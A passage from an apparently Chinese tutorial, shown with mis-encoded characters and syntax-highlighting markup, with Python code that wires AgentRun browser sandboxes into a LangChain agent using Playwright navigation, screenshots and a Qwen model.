            # æ¸…ç†çŠ¶æ€
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"Sandbox å·²é”€æ¯: {sandbox_id}"</span>
        
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            # å³ä½¿é”€æ¯å¤±è´¥ï¼Œä¹Ÿæ¸…ç†æœ¬åœ°çŠ¶æ€
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"é”€æ¯ Sandbox æ—¶å‡ºé”™: {str(e)}"</span>
    
    def <span class="hljs-title function_">is_active</span>(self) -&gt; <span class="hljs-attr">bool</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"æ£€æŸ¥ sandbox æ˜¯å¦æ´»è·ƒ"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">__enter__</span>(self):
        <span class="hljs-string">""</span><span class="hljs-string">"ä¸Šä¸‹æ–‡ç®¡ç†å™¨å…¥å£"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self
    
    def <span class="hljs-title function_">__exit__</span>(self, exc_type, exc_val, exc_tb):
        <span class="hljs-string">""</span><span class="hljs-string">"ä¸Šä¸‹æ–‡ç®¡ç†å™¨é€€å‡ºï¼Œè‡ªåŠ¨é”€æ¯"</span><span class="hljs-string">""</span>
        self.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">False</span>


# å…¨å±€å•ä¾‹ï¼ˆå¯é€‰ï¼Œç”¨äºç®€å•åœºæ™¯ï¼‰
<span class="hljs-attr">_global_manager</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">SandboxManager</span>] = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_global_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–å…¨å±€ SandboxManager å•ä¾‹"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> _global_manager is <span class="hljs-title class_">None</span>:
        _global_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _global_manager


def <span class="hljs-title function_">reset_global_manager</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"é‡ç½®å…¨å±€ SandboxManager"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_global_manager</span>:
        _global_manager.<span class="hljs-title function_">destroy</span>()
    _global_manager = <span class="hljs-title class_">None</span>
</code></pre>
<p><strong>å…³é”®åŠŸèƒ½ï¼š</strong></p>
<ol>
<li><strong>åˆ›å»º Sandbox</strong>: ä½¿ç”¨ AgentRun SDK åˆ›å»ºæµè§ˆå™¨ Sandbox</li>
<li><strong>è·å–è¿æ¥ä¿¡æ¯</strong>: è‡ªåŠ¨è·å– CDP URL å’Œ VNC URLï¼Œæ”¯æŒå¤šç§å±æ€§åå…¼å®¹</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>: æä¾›é”€æ¯æ–¹æ³•ï¼Œç¡®ä¿èµ„æºæ­£ç¡®é‡Šæ”¾</li>
</ol>
<h5 data-id="heading-16">æ­¥éª¤ 4: åˆ›å»º LangChain Tools å’Œ Agent</h5>
<p>åˆ›å»º <code>langchain_agent.py</code> æ–‡ä»¶ï¼Œå®šä¹‰ LangChain tools å¹¶åˆ›å»º Agentã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain Agent å’Œ Tools æ³¨å†Œæ¨¡å—

è´Ÿè´£åˆ›å»º LangChain Agentï¼Œæ³¨å†Œ Sandbox ç›¸å…³çš„ toolsï¼Œå¹¶é›†æˆ VNC å¯è§†åŒ–ã€‚

æœ¬æ¨¡å—ä½¿ç”¨ sandbox_manager.py ä¸­å°è£…çš„ SandboxManager æ¥ç®¡ç† sandbox ç”Ÿå‘½å‘¨æœŸã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">tools</span> <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> <span class="hljs-title class_">ChatOpenAI</span>
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">agents</span> <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> <span class="hljs-title class_">BaseModel</span>, <span class="hljs-title class_">Field</span>

# å¯¼å…¥ sandbox ç®¡ç†å™¨
<span class="hljs-keyword">from</span> sandbox_manager <span class="hljs-keyword">import</span> <span class="hljs-title class_">SandboxManager</span>

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()

# å…¨å±€ sandbox ç®¡ç†å™¨å®ä¾‹ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰
<span class="hljs-attr">_sandbox_manager</span>: <span class="hljs-title class_">SandboxManager</span> | <span class="hljs-title class_">None</span> = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_sandbox_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å– sandbox ç®¡ç†å™¨å®ä¾‹ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _sandbox_manager
    <span class="hljs-keyword">if</span> _sandbox_manager is <span class="hljs-title class_">None</span>:
        _sandbox_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _sandbox_manager


# ============ <span class="hljs-title class_">LangChain</span> <span class="hljs-title class_">Tools</span> å®šä¹‰ ============

<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">create_browser_sandbox</span>(
    <span class="hljs-attr">template_name</span>: str = <span class="hljs-title class_">None</span>,
    <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"åˆ›å»ºæˆ–è·å–ä¸€ä¸ªæµè§ˆå™¨ sandbox å®ä¾‹ã€‚
    
    å½“éœ€è¦è®¿é—®ç½‘é¡µã€æ‰§è¡Œæµè§ˆå™¨æ“ä½œæ—¶ï¼Œé¦–å…ˆéœ€è¦åˆ›å»º sandboxã€‚
    åˆ›å»ºæˆåŠŸåï¼Œä¼šè¿”å› sandbox ä¿¡æ¯ï¼ŒåŒ…æ‹¬ VNC URL ç”¨äºå¯è§†åŒ–ã€‚
    
    Args:
        template_name: Sandbox æ¨¡æ¿åç§°ï¼Œå¦‚æœä¸æä¾›åˆ™ä»ç¯å¢ƒå˜é‡ BROWSER_TEMPLATE_NAME è¯»å–
        idle_timeout: ç©ºé—²è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ï¼Œé»˜è®¤ 3000 ç§’
    
    Returns:
        Sandbox ä¿¡æ¯å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬ IDã€CDP URLã€VNC URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        # å¦‚æœ template_name ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè½¬æ¢ä¸º <span class="hljs-title class_">None</span> ä»¥ä¾¿ä»ç¯å¢ƒå˜é‡è¯»å–
        <span class="hljs-keyword">if</span> template_name == <span class="hljs-string">""</span>:
            template_name = <span class="hljs-title class_">None</span>
        info = manager.<span class="hljs-title function_">create</span>(template_name=template_name, idle_timeout=idle_timeout)
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"âœ… Sandbox åˆ›å»ºæˆåŠŸï¼

ğŸ“‹ Sandbox ä¿¡æ¯:
- ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
            result += f<span class="hljs-string">"- VNC URL: {vnc_url}\n\n"</span>
            result += <span class="hljs-string">"æç¤º: VNC æŸ¥çœ‹å™¨åº”è¯¥å·²è‡ªåŠ¨æ‰“å¼€ï¼Œæ‚¨å¯ä»¥åœ¨æµè§ˆå™¨ä¸­å®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œã€‚"</span>
        <span class="hljs-attr">else</span>:
            result += <span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œå¯èƒ½æ— æ³•ä½¿ç”¨å¯è§†åŒ–åŠŸèƒ½ã€‚"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" åˆ›å»º Sandbox å¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">get_sandbox_info</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–å½“å‰ sandbox çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IDã€CDP URLã€VNC URL ç­‰ã€‚
    
    å½“éœ€è¦æŸ¥çœ‹å½“å‰ sandbox çŠ¶æ€æˆ–è·å– VNC è¿æ¥ä¿¡æ¯æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚
    
    Returns:
        Sandbox ä¿¡æ¯å­—ç¬¦ä¸²
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        info = manager.<span class="hljs-title function_">get_info</span>()
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"ğŸ“‹ å½“å‰ Sandbox ä¿¡æ¯:

- Sandbox ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
            result += f<span class="hljs-string">"- VNC URL: {info['vnc_url']}\n\n"</span>
            result += <span class="hljs-string">"æ‚¨å¯ä»¥ä½¿ç”¨ VNC URL åœ¨æµè§ˆå™¨ä¸­å®æ—¶æŸ¥çœ‹æ“ä½œè¿‡ç¨‹ã€‚\n"</span>
            result += <span class="hljs-string">"   æ¨èä½¿ç”¨ vnc.html æ–‡ä»¶æˆ– noVNC å®¢æˆ·ç«¯ã€‚"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">RuntimeError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" {str(e)}"</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" è·å– Sandbox ä¿¡æ¯å¤±è´¥: {str(e)}"</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">NavigateInput</span>(<span class="hljs-title class_">BaseModel</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"æµè§ˆå™¨å¯¼èˆªè¾“å…¥å‚æ•°"</span><span class="hljs-string">""</span>
    <span class="hljs-attr">url</span>: str = <span class="hljs-title class_">Field</span>(description=<span class="hljs-string">"è¦è®¿é—®çš„ç½‘é¡µ URLï¼Œå¿…é¡»ä»¥ http:// æˆ– https:// å¼€å¤´"</span>)
    <span class="hljs-attr">wait_until</span>: str = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-string">"load"</span>,
        description=<span class="hljs-string">"ç­‰å¾…é¡µé¢åŠ è½½çš„çŠ¶æ€: load, domcontentloaded, networkidle"</span>
    )
    <span class="hljs-attr">timeout</span>: int = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-number">30000</span>,
        description=<span class="hljs-string">"è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œé»˜è®¤ 30000"</span>
    )


<span class="hljs-meta">@tool</span>(args_schema=<span class="hljs-title class_">NavigateInput</span>)
def <span class="hljs-title function_">navigate_to_url</span>(<span class="hljs-attr">url</span>: str, <span class="hljs-attr">wait_until</span>: str = <span class="hljs-string">"load"</span>, <span class="hljs-attr">timeout</span>: int = <span class="hljs-number">30000</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"ä½¿ç”¨ sandbox ä¸­çš„æµè§ˆå™¨å¯¼èˆªåˆ°æŒ‡å®š URLã€‚
    
    å½“ç”¨æˆ·éœ€è¦è®¿é—®ç½‘é¡µæ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚å¯¼èˆªåå¯ä»¥åœ¨ VNC ä¸­å®æ—¶æŸ¥çœ‹é¡µé¢ã€‚
    
    Args:
        url: è¦è®¿é—®çš„ç½‘é¡µ URL
        wait_until: ç­‰å¾…é¡µé¢åŠ è½½çš„çŠ¶æ€ï¼ˆload/domcontentloaded/networkidleï¼‰
        timeout: è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
    
    Returns:
        å¯¼èˆªç»“æœæè¿°
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: è¯·å…ˆåˆ›å»º sandbox"</span>
        
        # éªŒè¯ <span class="hljs-variable constant_">URL</span>
        <span class="hljs-keyword">if</span> not url.<span class="hljs-title function_">startswith</span>((<span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span>)):
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" é”™è¯¯: æ— æ•ˆçš„ URL æ ¼å¼: {url}"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ— æ³•è·å– CDP URL"</span>
        
        # ä½¿ç”¨ <span class="hljs-title class_">Playwright</span> è¿æ¥æµè§ˆå™¨å¹¶å¯¼èˆª
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    page = browser.<span class="hljs-title function_">new_page</span>()
                
                page.<span class="hljs-title function_">goto</span>(url, wait_until=wait_until, timeout=timeout)
                title = page.<span class="hljs-title function_">title</span>()
                
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"å·²æˆåŠŸå¯¼èˆªåˆ°: {url}\nğŸ“„ é¡µé¢æ ‡é¢˜: {title}\nğŸ’¡ æ‚¨å¯ä»¥åœ¨ VNC ä¸­æŸ¥çœ‹é¡µé¢å†…å®¹ã€‚"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"å¯¼èˆªæŒ‡ä»¤å·²å‘é€: {url}\nğŸ’¡ æç¤º: å®‰è£… playwright ä»¥å¯ç”¨å®é™…å¯¼èˆªåŠŸèƒ½ (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" å¯¼èˆªå¤±è´¥: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" æ“ä½œå¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"browser_screenshot"</span>, description=<span class="hljs-string">"åœ¨æµè§ˆå™¨ sandbox ä¸­æˆªå–å½“å‰é¡µé¢æˆªå›¾"</span>)
def <span class="hljs-title function_">take_screenshot</span>(<span class="hljs-attr">filename</span>: str = <span class="hljs-string">"screenshot.png"</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"æˆªå–æµè§ˆå™¨å½“å‰é¡µé¢çš„æˆªå›¾ã€‚
    
    Args:
        filename: æˆªå›¾æ–‡ä»¶åï¼Œé»˜è®¤ "</span>screenshot.<span class="hljs-property">png</span><span class="hljs-string">"
    
    Returns:
        æ“ä½œç»“æœ
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: è¯·å…ˆåˆ›å»º sandbox"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ— æ³•è·å– CDP URL"</span>
        
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ²¡æœ‰æ‰“å¼€çš„é¡µé¢"</span>
                
                page.<span class="hljs-title function_">screenshot</span>(path=filename)
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"æˆªå›¾å·²ä¿å­˜: {filename}"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: éœ€è¦å®‰è£… playwright (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" æˆªå›¾å¤±è´¥: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" æ“ä½œå¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"destroy_sandbox"</span>, description=<span class="hljs-string">"é”€æ¯å½“å‰çš„ sandbox å®ä¾‹ï¼Œé‡Šæ”¾èµ„æºã€‚æ³¨æ„ï¼šä»…åœ¨ç¨‹åºé€€å‡ºæˆ–æ˜ç¡®éœ€è¦é‡Šæ”¾èµ„æºæ—¶ä½¿ç”¨ï¼Œä¸è¦åœ¨ä¸€è½®å¯¹è¯åé”€æ¯ã€‚"</span>)
def <span class="hljs-title function_">destroy_sandbox</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"é”€æ¯å½“å‰çš„ sandbox å®ä¾‹ã€‚
    
    é‡è¦æç¤ºï¼šæ­¤å·¥å…·åº”è¯¥ä»…åœ¨ä»¥ä¸‹æƒ…å†µä½¿ç”¨ï¼š
    - ç¨‹åºå³å°†é€€å‡º
    - æ˜ç¡®éœ€è¦é‡Šæ”¾èµ„æº
    - ç”¨æˆ·æ˜ç¡®è¦æ±‚é”€æ¯
    
    ä¸è¦åœ¨ä¸€è½®å¯¹è¯å®Œæˆåå°±é”€æ¯ sandboxï¼Œå› ä¸º sandbox å¯ä»¥åœ¨å¤šè½®å¯¹è¯ä¸­å¤ç”¨ã€‚
    
    Returns:
        æ“ä½œç»“æœ
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        result = manager.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> result
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" é”€æ¯å¤±è´¥: {str(e)}"</span>


# ============ <span class="hljs-title class_">Agent</span> åˆ›å»º ============

def <span class="hljs-title function_">create_browser_agent</span>(<span class="hljs-attr">system_prompt</span>: str = <span class="hljs-title class_">None</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"
    åˆ›å»ºå¸¦æœ‰ sandbox å·¥å…·çš„ LangChain Agent
    
    Args:
        system_prompt: è‡ªå®šä¹‰ç³»ç»Ÿæç¤ºè¯ï¼Œå¦‚æœä¸º None åˆ™ä½¿ç”¨é»˜è®¤æç¤ºè¯
    
    Returns:
        LangChain Agent å®ä¾‹
    "</span><span class="hljs-string">""</span>
    # é…ç½® <span class="hljs-title class_">DashScope</span> <span class="hljs-variable constant_">API</span>
    api_key = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>)
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">api_key</span>:
        raise <span class="hljs-title class_">ValueError</span>(<span class="hljs-string">"è¯·è®¾ç½®ç¯å¢ƒå˜é‡ DASHSCOPE_API_KEY"</span>)
    
    base_url = <span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>
    model_name = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"QWEN_MODEL"</span>, <span class="hljs-string">"qwen-plus"</span>)
    
    # åˆ›å»º <span class="hljs-variable constant_">LLM</span>
    model = <span class="hljs-title class_">ChatOpenAI</span>(
        model=model_name,
        api_key=api_key,
        base_url=base_url,
        temperature=<span class="hljs-number">0.7</span>,
    )
    
    # åˆ›å»ºå·¥å…·åˆ—è¡¨
    tools = [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
    
    # é»˜è®¤ç³»ç»Ÿæç¤ºè¯
    <span class="hljs-keyword">if</span> system_prompt is <span class="hljs-title class_">None</span>:
        system_prompt = <span class="hljs-string">""</span><span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæµè§ˆå™¨è‡ªåŠ¨åŒ–åŠ©æ‰‹ï¼Œå¯ä»¥ä½¿ç”¨ sandbox æ¥è®¿é—®å’Œæ“ä½œç½‘é¡µã€‚

å½“ç”¨æˆ·éœ€è¦è®¿é—®ç½‘é¡µæ—¶ï¼Œè¯·æŒ‰ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š
1. é¦–å…ˆåˆ›å»ºæˆ–è·å– sandboxï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰
2. ä½¿ç”¨ navigate_to_url å¯¼èˆªåˆ°ç›®æ ‡ç½‘é¡µ
3. æ‰§è¡Œç”¨æˆ·è¯·æ±‚çš„æ“ä½œ
4. å¦‚æœéœ€è¦ï¼Œå¯ä»¥æˆªå–æˆªå›¾

é‡è¦æç¤ºï¼š
- åˆ›å»º sandbox åï¼Œä¼šè¿”å› VNC URLï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å®ƒå®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œ
- æ‰€æœ‰æ“ä½œéƒ½ä¼šåœ¨ VNC ä¸­å®æ—¶æ˜¾ç¤ºï¼Œæ–¹ä¾¿è°ƒè¯•å’Œç›‘æ§
- sandbox å¯ä»¥åœ¨å¤šè½®å¯¹è¯ä¸­å¤ç”¨ï¼Œä¸è¦åœ¨ä¸€è½®å¯¹è¯å®Œæˆåå°±é”€æ¯
- åªæœ‰åœ¨ç”¨æˆ·æ˜ç¡®è¦æ±‚é”€æ¯æ—¶æ‰ä½¿ç”¨ destroy_sandbox å·¥å…·
- ä¸è¦ä¸»åŠ¨å»ºè®®ç”¨æˆ·é”€æ¯ sandboxï¼Œé™¤éç”¨æˆ·æ˜ç¡®è¦æ±‚
- è¯·å§‹ç»ˆç”¨ä¸­æ–‡å›å¤ï¼Œç¡®ä¿æ“ä½œå‡†ç¡®ã€é«˜æ•ˆã€‚"</span><span class="hljs-string">""</span>
    
    # åˆ›å»º <span class="hljs-title class_">Agent</span>
    agent = <span class="hljs-title function_">create_agent</span>(
        model=model,
        tools=tools,
        system_prompt=system_prompt,
    )
    
    <span class="hljs-keyword">return</span> agent


def <span class="hljs-title function_">get_available_tools</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–æ‰€æœ‰å¯ç”¨çš„å·¥å…·åˆ—è¡¨"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">return</span> [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
</code></pre>
<p><strong>å…³é”®è¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>Tool å®šä¹‰</strong>: ä½¿ç”¨ <code>@tool</code> è£…é¥°å™¨å®šä¹‰ LangChain tools</li>
<li><strong>ç±»å‹æç¤º</strong>: æ‰€æœ‰å‚æ•°å¿…é¡»æœ‰ç±»å‹æç¤ºï¼Œç”¨äºç”Ÿæˆå·¥å…· schema</li>
<li><strong>æ–‡æ¡£å­—ç¬¦ä¸²</strong>: è¯¦ç»†çš„æ–‡æ¡£å­—ç¬¦ä¸²å¸®åŠ© LLM ç†è§£ä½•æ—¶ä½¿ç”¨å·¥å…·</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>: ä½¿ç”¨å…¨å±€ç®¡ç†å™¨å®ä¾‹ç¡®ä¿ Sandbox åœ¨ä¼šè¯ä¸­å¤ç”¨</li>
</ol>
<h5 data-id="heading-17">æ­¥éª¤ 5: åˆ›å»ºä¸»å…¥å£æ–‡ä»¶</h5>
<p>åˆ›å»º <code>main.py</code> æ–‡ä»¶ï¼Œä½œä¸ºç¨‹åºå…¥å£ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain + AgentRun Browser Sandbox é›†æˆç¤ºä¾‹

ä¸»å…¥å£æ–‡ä»¶ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ LangChain Agent ä¸ AgentRun Browser Sandbox é›†æˆã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> http.<span class="hljs-property">server</span>
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain_agent <span class="hljs-keyword">import</span> create_browser_agent, get_sandbox_manager

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()

# å…¨å±€ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨å®ä¾‹
_http_server = <span class="hljs-title class_">None</span>
_http_port = <span class="hljs-number">8080</span>

# å…¨å±€æ¸…ç†æ ‡å¿—ï¼Œç”¨äºé˜²æ­¢é‡å¤æ¸…ç†
_cleanup_done = <span class="hljs-title class_">False</span>


def <span class="hljs-title function_">start_http_server</span>():
